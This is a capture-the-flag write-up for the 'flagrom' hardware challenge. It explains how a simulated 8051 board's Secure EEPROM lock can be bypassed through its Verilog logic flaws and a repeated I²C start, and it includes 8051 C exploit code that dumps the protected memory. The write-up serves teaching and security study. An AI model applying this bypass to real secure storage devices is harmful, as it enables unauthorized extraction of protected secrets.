---
name: flagrom
category: Hardware
points: 187
solves: 57
---

{% ignore %}
[Go to rendered GitBook version](https://sasdf.cf/ctf/)
{% endignore %}

> This 8051 board has a SecureEEPROM installed.
> It's obvious the flag is stored there.
> Go and get it.


## Time
1.5 hour  


# Behavior
The service is a 8051 simulator.
And it has a custom Secure EEPROM chip connected to its I²C Port.

The service will run a firmware first to write the flag to that EEPROM.
After locking the flag to prevent from accessing, the service will run the 8051 code we provided.

The goal is bypass the lock and read our flag out.

They provide the ELF executable of simulator,
firmware source code in C,
and SecureEEPROM source code in verilog.


# Solution
## TL;DR
1. Communicate to the EEPROM using raw I²C GPIO.
2. Set the `i2c_address_valid` bit using address 0.
3. Force reset the state by trigging `i2c_start`.
6. Lock all pages.
7. Force reset the state by trigging `i2c_start`.
8. Read the whole memory out.


## 8051 setup
This part is about the environment setup.
Feel free to skip this section if you've read the challenge's code.

First, lets look at what the challenge do.
The simulator binary is unstriped and easy to understand.

Here's the simplified main function of simulator:

```c
dev_i2c[0] = seeprom_new();

puts("Executing firmware...");
init_emu(&emu);
emu8051::mem_write(&emu, 3, 0, &firmware, &loc_10000);
emu8051::mem_write(&emu, 2, 0xFF00, &flag, 128);
memset(&flag, 0, 0x80);
done_marker = 0;
while ( !done_marker ) {
    emu8051::execute(&emu, 1);
}
remove_flag();

puts("Executing usercode...");
init_emu(&emu);
emu8051::mem_write(&emu, 3, 0, &usercode, &loc_10000);
done_marker = 0;
for ( i = 0; i < 100000 && !done_marker; ++i ) {
    emu8051::execute(&emu, 1);
}
```

and the main function of firmware:

```c
write_flag();    // Store the flag to SecureEEPROM at offset 64 (page 1)
secure_banks();  // Lock page 1 to prevent from accessing
remove_flag();   // Clear the flag in 8051's RAM
write_welcome(); // Write a welcome message to page 0.
POWEROFF = 1;
```

Clearly, it will run a firmware to store the flag, and then it'll runs our code.

In the `init_emu` function,

```c
void init_emu(emu8051 *emu) {
  emu8051::sfr_register_handler(emu, 0xFA, sfr_gpio_module);
  emu8051::sfr_register_handler(emu, 0xFB, sfr_gpio_module);
  emu8051::sfr_register_handler(emu, 0xFC, sfr_i2c_module);
  emu8051::sfr_register_handler(emu, 0xFD, sfr_character_output);
  emu8051::sfr_register_handler(emu, 0xFE, sfr_debug_print);
  emu8051::sfr_register_handler(emu, 0xFF, sfr_done_marker);
}

int sfr_gpio_module(__int64 a1, int is_write, __int64 a3, unsigned char sfr, char *value) {
  if ( sfr == 0xFAu ) {
    if ( is_write == 1 )
      seeprom_write_scl(dev_i2c[0], (*value & 1) != 0);
    else
      *value = -1;
  }
  if ( sfr == 0xFBu ) {
    if ( is_write == 1 )
      seeprom_write_sda(dev_i2c[0], (*value & 1) != 0);
    else
      *value = seeprom_read_sda(dev_i2c[0]);
  }
}
```

> Some background knowledge  
> A SFR (Special Function Register) is a register within a microprocessor,
> which controls or monitors various aspects of the microprocessor's function.  
> I²C is a wire protocol for communicating between multiple devices.
> It uses two wires, SCL is clock, and SDA is for data.

We can see that the 8051 has a builtin I²C module, which is connected to a SecureEEPROM.
We can also control the I²C pin directly using GPIO.

Those sfr definitions are also provided in `firmware.c` too.
```c
__sfr __at(0xff) POWEROFF;
__sfr __at(0xfe) DEBUG;
__sfr __at(0xfd) CHAROUT;
__xdata __at(0xff00) unsigned char FLAG[0x100];

__sfr __at(0xfa) RAW_I2C_SCL;
__sfr __at(0xfb) RAW_I2C_SDA;

// I2C-M module/chip control data structure.
__xdata __at(0xfe00) unsigned char I2C_ADDR; // 8-bit version.
__xdata __at(0xfe01) unsigned char I2C_LENGTH;  // At most 8 (excluding addr).
__xdata __at(0xfe02) unsigned char I2C_RW_MASK;  // 1 R, 0 W.
__xdata __at(0xfe03) unsigned char I2C_ERROR_CODE;  // 0 - no errors.
__xdata __at(0xfe08) unsigned char I2C_DATA[8];  // Don't repeat addr.
__sfr __at(0xfc) I2C_STATE;  // Read: 0 - idle, 1 - busy; Write: 1 - start
```


## Secure EEPROM
It's implemented as a state machine, 
containing several states like:

```
I2C_IDLE
I2C_START
I2C_LOAD_CONTROL
I2C_LOAD_ADDRESS
I2C_WRITE
I2C_READ
```

The lock is stored in a bit mask, which cannot be cleared after set:

```verilog
logic [3:0] mem_secure;

# i2c_control is our input
wire [3:0] i2c_control_bank = i2c_control[3:0];

...

`I2C_CONTROL_SECURE: begin
    mem_secure <= mem_secure | i2c_control_bank;
    i2c_state <= I2C_ACK;
end
```

The first strange thing I noticed is how it check the lock when reading / writing:

```verilog
# i2c_address is the offset we set
wire i2c_address_secure = mem_secure[i2c_address / 64];
wire i2c_next_address_secure = mem_secure[(i2c_address + 1) / 64];

...

if (i2c_address_secure == i2c_next_address_secure) begin
    /* read or write the memory */
end else begin
    i2c_state <= I2C_NACK;
end
```

instead of checking whether current page is locked or not,
it checks that the lock of current byte and next byte are the same.

We can bypass this check when both pages are locked.

However, there's another check when setting `i2c_address`:

```verilog
if (i2c_address_secure) begin
    i2c_address_valid <= 0;
    i2c_state <= I2C_NACK;
end else begin
    i2c_data_bits <= 0;
    i2c_address_valid <= 1;
    i2c_state <= I2C_ACK_THEN_WRITE;
end
```

and we can only switch to `I2C_READ` state when `i2c_address_valid` is 1.

There are two conditions that `i2c_address_valid` will be set to zero:
* We send a address which is locked
* We send a special sequence `i2c_stop`

If we communicate with the EEPROM using builtin I²C module,
a `i2c_stop` will be sent after each request.

But sending `i2c_stop` is not necessary.
We can reset the state by sending `i2c_start` instead of `i2c_stop`:

```verilog
if (i2c_stop) begin
    i2c_address_valid <= 0;
    i2c_state <= I2C_IDLE;
end else if (i2c_start) begin
    i2c_state <= I2C_START;
end
```

BTW, sending `i2c_start` again is a valid operation in I²C specification.
Here's the description from wikipedia:

> After the acknowledge bit, the clock line is low and the master may do one of three things:
> * Begin transferring another byte of data: the transmitter sets SDA, and the master pulses SCL high.
> * Send a "Stop": Set SDA low, let SCL go high, then let SDA go high. This releases the I²C bus.
> * Send a "Repeated start": Set SDA high, let SCL go high, then pull SDA low again. This starts a new I²C bus message without releasing the bus.


## Bypass the lock

Now, the goal is clear,
* Set the address to zero. It is not locked, so `i2c_address_valid` is 1.
* Lock all pages to bypass the check in `I2C_READ`
* Read all 256 bytes in the memory.

To implemented the I²C protocol,
I copy those code in the simulator and modify them.
For example,

```c
/* Original code in the simulator */
void send_start(__int64 a1) {
  seeprom_write_scl(a1, 0);
  seeprom_write_sda(a1, 1);
  seeprom_write_scl(a1, 1);
  seeprom_write_sda(a1, 0);
}

/* Modified code to run on 8051 */
void send_start() {
  RAW_I2C_SCL = 0;
  RAW_I2C_SDA = 1;
  RAW_I2C_SCL = 1;
  RAW_I2C_SDA = 0;
}
```

And below is our main exploit, you can find the full script at [here]([_files/user.c])

First, set the address to zero

```c
print("start\n");
send_start();

print("op load_address\n");
send_byte(SEEPROM_I2C_ADDR_WRITE);
if (!recv_ack()) { print("failed 0\n"); goto end; }

print("addr 0\n");
send_byte(0);
if (!recv_ack()) { print("failed 1\n"); goto end; }
```

Next, lock all pages.

```c
print("restart\n");
send_start();

print("op secure\n");
send_byte(SEEPROM_I2C_ADDR_SECURE | 0b1111);
if (!recv_ack()) { print("failed 2\n"); goto end; }
```

Finally, dump the whole memory.

```c
print("restart 2\n");
send_start();

print("op read\n");
send_byte(SEEPROM_I2C_ADDR_READ);
if (!recv_ack()) { print("failed 3\n"); goto end; }

for (i=0; i<256; i++) {
    c = recv_byte();
    if (!recv_ack()) { print("failed read\n"); goto end; }
    CHAROUT = c; // print out the byte
}
print("\n");
```
